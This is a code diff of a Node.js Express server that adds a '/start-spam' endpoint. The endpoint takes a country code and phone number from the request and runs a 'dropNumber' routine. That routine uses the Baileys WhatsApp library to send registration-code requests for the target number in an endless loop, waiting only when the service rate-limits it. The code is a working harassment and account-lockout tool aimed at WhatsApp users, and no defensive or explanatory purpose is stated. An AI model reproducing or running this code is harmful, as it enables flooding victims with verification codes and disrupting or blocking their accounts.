@@ -3,6 +3,7 @@ const numCPUs = require('os').cpus().length;
 const express = require('express');
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
+const { default: makeWaSocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers  } = require('@whiskeysockets/baileys');
 const path = require('path');
 const ejs = require('ejs');
 const pinoo = require('pino');
@@ -87,52 +88,59 @@ console.log('Alle Pino-Logs wurden in die Datei geschrieben:', logFilePath);
         res.render(path.join('qr.js'), { title: 'qr' });
     });
    
+    app.post('/start-spam', async (req, res) => {
+        const { ddi, number } = req.body;
     
-app.post('/start-spam', async (req, res) => {
-    const { ddi, number } = req.body;
-
-    try {
- // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
- const existingData = await SpamData.findOne({ ddi, number });
- if (existingData) {
-     console.log('Data already exists');
- } else {
-     // Neue Instanz des Modells erstellen und speichern
-     const newData = new SpamData({ ddi, number });
-     await newData.save();
-     console.log('Data saved successfully');
- }
-
-
-        const { state, saveCreds } = await useMultiFileAuthState('.mm');
-        const spam = makeWaSocket({
-            auth: state,
-            mobile: true,
-            logger: pino({ level: 'silent' })
-        });
+        try {
+            // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
+            const existingData = await SpamData.findOne({ ddi, number });
+            if (existingData) {
+                return res.status(400).json({ error: 'Data already exists' });
+            } else {
+                // Neue Instanz des Modells erstellen und speichern
+                const newData = new SpamData({ ddi, number });
+                await newData.save();
+                console.log('Data saved successfully');
+            }
     
+            const { state } = await useMultiFileAuthState('.mm');
+            const spam = makeWaSocket({
+                auth: state,
+                mobile: true,
+                logger: pino({ level: 'silent' }),
+            });
+            const phoneNumber = ddi + number;
+            await dropNumber(spam, phoneNumber, ddi, number);
+    
+            // Erfolgreiche Antwort an den Client senden
+            res.status(200).json({ message: 'Spam started successfully' });
+        } catch (error) {
+            console.log(error);
+            res.status(500).json({ error: 'Internal server error' });
+        }
+    });
+    
+    async function dropNumber(spam, phoneNumber, ddi, number) {
         while (true) {
             try {
-                const response = await spam.requestRegistrationCode({
-                    phoneNumber: '+' + ddi + number,
+                const res = await spam.requestRegistrationCode({
+                    phoneNumber: '+' + phoneNumber,
                     phoneNumberCountryCode: ddi,
                     phoneNumberNationalNumber: number,
-                    phoneNumberMobileCountryCode: 724
+                    phoneNumberMobileCountryCode: 262,
                 });
-    
-                res.json({ success: true, response });
-                return;
-            } catch (err) {
-                // Fehler ignorieren und keine Aktion ausführen
+                const temporarilyUnavailable = res.reason === 'temporarily_unavailable';
+                if (temporarilyUnavailable) {
+                    console.log(gradient('red', 'red')(`+${res.login}@s.whatsapp.net`));
+                    await new Promise(resolve => setTimeout(resolve, res.retry_after * 10));
+                }
+            } catch (error) {
+                console.log(error);
+                // Möglicherweise weitere Fehlerbehandlung erforderlich
             }
         }
-    } catch (err) {
-        // Fehler ignorieren und keine Aktion ausführen
     }
-});
-
-
-
+    
     // Start server
     app.listen(port, () => {
         log.info(`Worker ${process.pid} started and is listening on port ${port}`);
